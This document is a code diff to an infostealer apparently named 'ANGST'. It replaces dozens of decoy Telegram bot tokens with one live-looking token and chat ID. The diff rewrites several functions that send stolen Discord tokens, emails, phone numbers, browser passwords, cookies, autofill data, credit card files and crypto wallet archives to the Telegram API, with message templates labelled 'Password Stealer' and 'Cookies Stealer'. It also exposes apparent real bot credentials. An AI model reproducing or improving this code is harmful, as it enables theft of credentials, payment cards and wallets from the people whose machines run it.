@@ -39,92 +39,8 @@ for module in ModuleRequirements:
 
 from Crypto.Cipher import AES
 
-b0t_t0ken = "6512845245:AABcXpoYLG66q8v0CtyE_HFbcXwyIm6MT7Y"
-ch4t_id = "5170268178"
-bot_t0ken = "8512842245:AADcXloYLG86q9u0FtyE_DGdcYwyXm5RT7Y"
-cha7_id = "4170269171"
-b0t_token = "9512848245:AAEcXroYLF66q6u0DtyE_FHdcYwyGm3NT7Z"
-chat_1d = "3170268175"
-b0ttoken = "5512847245:AAFfXnoYLG16q5w0EtyE_HFdcXwyKm8OT7Z"
-cht_id = "2170261178"
-bot_toke = "6512745245:AAGgXuoYLJ26q4v0CtyE_BGfcYwyTm4RT6Z"
-chatld = "8170268170"
-bo7_t0ken = "8512843245:AAHhXyoYLG36q7t0CtyE_HFgcYwyEm6QT8Y"
-chatid = "6170268159"
-bot_t0ke = "9512842245:AAJkXzoYLJ56q5v0EtyE_JHgcYwyJm7NT6X"
-cha7_1d = "7170268183"
-bot_toke3n = "6512843245:AALmXmoYLH46q9r0DtyE_KFdcYwyRm8OT7Z"
-cha_tid = "9170268177"
-bo0t_token = "7512745245:AANnXpoYLK86q7o0CtyE_LHfcYwyTm3MT7X"
-ch7t_id = "6170268161"
-b0tt_0ken = "8512845245:AAOpXroYLF96q3n0FtyE_MFecYwyBm4LT7Z"
-c4hat_id = "5170268180"
-bot__token = "6512945245:AAQqXtoYLH06q6o0BtyE_GFdcYwyLm5OT6Z"
-chhat_id = "7170268129"
-bot_tok3n = "9512846245:AARSXsoYLG16q7k0DtyE_NHgcYwyFm3NT5Z"
-chat1_d = "6170268138"
-bo7t_t0ken = "7512848245:AATtXuoYLG46q9u0EtyE_PFecYwyHm8PT7Z"
-chat_idd = "8170268195"
-bottoken = "8512945245:AAUuXmoYLH96q2t0CtyE_QHdcYwyTm4MT8Z"
-chat__id = "3170268172"
-botoken = "6512841245:AAVvXroYLG06q3n0BtyE_RHfcYwyKm7LT6X"
-caht_id = "6170268193"
-b0t_oken = "9512745245:AAWwXtoYLJ76q5m0DtyE_SHgcYwyJm9NT5Z"
-chat7_id = "5170268119"
-bo_t_token = "7512946245:AAXxXuoYLF26q4k0EtyE_TFgcYwyFm6PT6X"
-chat_id7 = "8170268184"
-bott_tok3n = "8512847245:AAYyXmoYLH56q7j0CtyE_UHfcYwyLm8OT5Y"
-c4ht_id = "4170268196"
-b0t_0ken = "6512846245:AAZzXroYLK16q6n0BtyE_VHgcYwyTm9MT6Y"
-chat_iid = "7170268137"
-botttoken = "9512943245:AAaAXsoYLJ86q5m0EtyE_WHgcYwyHm6OT7Y"
-c4t_id = "6170268118"
-bo0t_tok3n = "7512849245:AAbBXtoYLF06q3k0CtyE_XHecYwyKm8PT6Z"
-chta_id = "8170268155"
-b0ttt_token = "8512745245:AAdCXuoYLH46q8l0BtyE_YHfcYwyTm7OT8X"
-chatt_id = "5170268194"
-bot_tokken = "6512848245:AAeDXroYLJ26q7n0DtyE_ZHdcYwyFm9MT7Z"
-catt_id = "3170268131"
-b00t_token = "9512844245:AAfEXsoYLK06q5j0EtyE_AGgcYwyJm8NT5Y"
-ch8t_id = "6170268192"
-bot_t0kken = "7325262322:AAEgY26RNoyWoHEGP11WrJtAFUyT7wOwBtU" #
-cattid = "6170268179" ##
-bo_tkn = "8512945245:AAhGXuoYLF46q9m0EtyE_CHgcYwyHm6OT9Y"
-chtt_id = "5170268136"
-b0t_tkn = "6512745245:AAiHXroYLJ76q6n0BtyE_DHdcYwyKm7MT6X"
-chat1id = "4170268182"
-bo7_tok3n = "9512841245:AAjIXsoYLH06q4j0CtyE_EHecYwyTm9PT8Y"
-chat_7id = "6170268154"
-bo0t_t0ken = "7512845245:AAkJXtoYLF26q7m0DtyE_FHfcYwyFm4MT7X"
-cht_idd = "8170268176"
-botoken7 = "8512843245:AAlKXuoYLJ36q8o0EtyE_GHgcYwyHm8PT9Z"
-ch_t_id = "3170268128"
-bot_token7 = "6512943245:AAmLXroYLF16q3l0CtyE_HHdcYwyKm4OT8Y"
-cha_t_id = "7170268191"
-botten_token = "9512845245:AAnMXsoYLH46q6n0BtyE_IHecYwyLm9PT6Y"
-chat7id = "5170268157"
-bo77_token = "7512946245:AAoNXtoYLJ06q7m0EtyE_JHfcYwyFm5MT8X"
-chat_i7d = "8170268125"
-bot0_token = "8512841245:AApOXuoYLK16q4o0CtyE_KHgcYwyTm6OT9X"
-cha_tid7 = "6170268190"
-bo7token = "6512745245:AAqPXroYLF26q3l0BtyE_LHdcYwyHm9PT6Z"
-cha_tid1 = "5170268121"
-b0t_token0 = "9512847245:AArQXsoYLH76q6m0EtyE_MHfcYwyKm4MT9Y"
-chatd_id = "3170268156"
-bot_tken = "7512843245:AAsRXtoYLF46q5k0CtyE_NHgcYwyLm3OT6Z"
-cht_id7 = "8170268199"
-botoken0 = "8512946245:AAtSXuoYLJ16q4m0BtyE_OHecYwyFm6PT8X"
-ch_t_id7 = "4170268120"
-bo_tt0ken = "6512842245:AAuTXroYLK56q7n0DtyE_PHgcYwyHm7MT9X"
-chatid1 = "5170268181"
-bot_0tok3n = "9512945245:AAvUXsoYLJ96q6l0CtyE_QHdcYwyKm9OT8Y"
-cah_t_id = "3170268173"
-b07_token = "7512841245:AAwVXtoYLH16q5m0EtyE_RHfcYwyLm4PT9Y"
-cahtid = "6170268152"
-b0t_tokken = "8512745245:AAxWXuoYLJ86q4k0BtyE_SHgcYwyFm7MT6X"
-caht_id7 = "8170268139"
-bo0t_t0kken = "6512843245:AAYyXtoYLK46q7n0EtyE_THecYwyHm9OT7X"
-caht_id1 = "5170268198"
+bot_token = "7512845245:AAHcXtoYLJ66q7w0BtyE_GFacYwyHm4NT7Y"
+chat_id = "6170268179"
 
 
 class DATA_BLOB(Structure):
@@ -518,7 +434,7 @@ def Trim(obj):
     return obj
 
 def uploadToken(token, path):
-    url = f"https://api.telegram.org/bot{bot_t0kken}/sendMessage"
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
 
     username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
 
@@ -541,7 +457,7 @@ def uploadToken(token, path):
 
     message = (
         f"ANGST | Discord Info\n\n"
-        f"» Username: {username}\n"
+        f"» Username: {username}#{hashtag}\n"
         f"» Token: `{token}`\n"
         f"» Email: `{email}`\n"
         f"» Phone: `{phone}`\n"
@@ -552,7 +468,7 @@ def uploadToken(token, path):
     )
 
     data = {
-        "chat_id": cattid,
+        "chat_id": chat_id,
         "text": message,
         "parse_mode": "Markdown"
     }
@@ -576,7 +492,7 @@ def Reformat(listt):
 import requests
 
 def upload(name, link):
-    url = f"https://api.telegram.org/bot{bot_t0kken}/sendMessage"
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -584,7 +500,7 @@ def upload(name, link):
 
     if "Data Searcher" in name:
         data = {
-            "chat_id": x,
+            "chat_id": chat_id,
             "text": f"ANGST | Data Extractor\nGLINFO: {GLINFO}",
         }
 
@@ -600,7 +516,7 @@ def upload(name, link):
 
     if "NationsGlory" in name:
         data = {
-            "chat_id": cattid,
+            "chat_id": chat_id,
             "text": f"ANGST | {name.split(';')[0]}\nLink: {link}\nGLINFO: {GLINFO}",
         }
 
@@ -630,7 +546,7 @@ def upload(name, link):
 
         fields = "\n".join(endlist)
         data = {
-            "chat_id": x,
+            "chat_id": chat_id,
             "text": f"ANGST | File Stealer\n\n{fields}\nGLINFO: {GLINFO}",
         }
 
@@ -872,7 +788,7 @@ def startBthread(func, arg):
     Browserthread.append(t)
 
 def getBrowsers(browserPaths):
-    url = f"https://api.telegram.org/bot{bot_t0kken}/sendMessage"
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
     global Browserthread
     FirefoxCookie()
     ThCokk, Browserthread, filess = [], [], []
@@ -908,16 +824,26 @@ def getBrowsers(browserPaths):
     }
 
     data = {
-        "chat_id": cattid,
+        "chat_id": chat_id,
         "text": (
-            f"🔐 [Passwords]({filess[0]}): {PasswCount}\n"
-            f"🍪 [Cookies]({filess[5]}): {CookiCount}\n"
-            f"🗒 [Autofills]({filess[3]}): {AutofillCount}\n"
-            f"💳 [CCs]({filess[2]}): {CCsCount}\n\n"
-            f"__Passwords found:__\n{getwebsites(paswWords)}\n\n"
-            f"__Cookies found:__\n{getwebsites(cookiWords)}\n\n"
-
-
+            f"*ANGST | Password Stealer*\n\n"
+            f"**Found**:\n{getwebsites(paswWords)}\n\n"
+            f"**Data:**\n🔑 • **{PasswCount}** Passwords Found\n"
+            f"🔗 • [Passwords.txt]({filess[0]})\n\n"
+            f"*ANGST | Cookies Stealer*\n\n"
+            f"**Found**:\n{getwebsites(cookiWords)}\n\n"
+            f"**Data:**\n🍪 • **{CookiCount}** Cookies Found\n"
+            f"🔗 • [Cookies.txt]({filess[1]})\n"
+            f"🔗 • [Parsed.txt]({filess[5]})\n\n"
+            f"*ANGST | Other*\n\n"
+            f"🗞 • **{HistoryCount}** Websites Found\n"
+            f"🔗 • [history.txt]({filess[4]})\n\n"
+            f"🛡 • **{AutofillCount}** Infos Found\n"
+            f"🔗 • [autofill.txt]({filess[3]})\n\n"
+            f"📘 • **{BookmarksCount}** Bookmarks found\n"
+            f"🔗 • [bookmarks.txt]({filess[6]})\n\n"
+            f"💳 • **{CCsCount}** Creditcards Found\n"
+            f"🔗 • [creditcards.txt]({filess[2]})"
         ),
         "parse_mode": "Markdown"
     }
@@ -1076,7 +1002,7 @@ def ngstealer(path):
             pass
 
 def GatherZips(paths1, paths2, paths3):
-    url = f"https://api.telegram.org/bot{bot_t0kken}/sendMessage"
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
     thttht = []
 
     for walletids in wallts:
@@ -1127,7 +1053,7 @@ def GatherZips(paths1, paths2, paths3):
             ot += f"└─ [{i[0]}]({i[1]})\n"
     
     data = {
-        "chat_id": cattid,
+        "chat_id": chat_id,
         "text": f"{wal}\n{ga}\n{ot}",
         "parse_mode": "Markdown"
     }
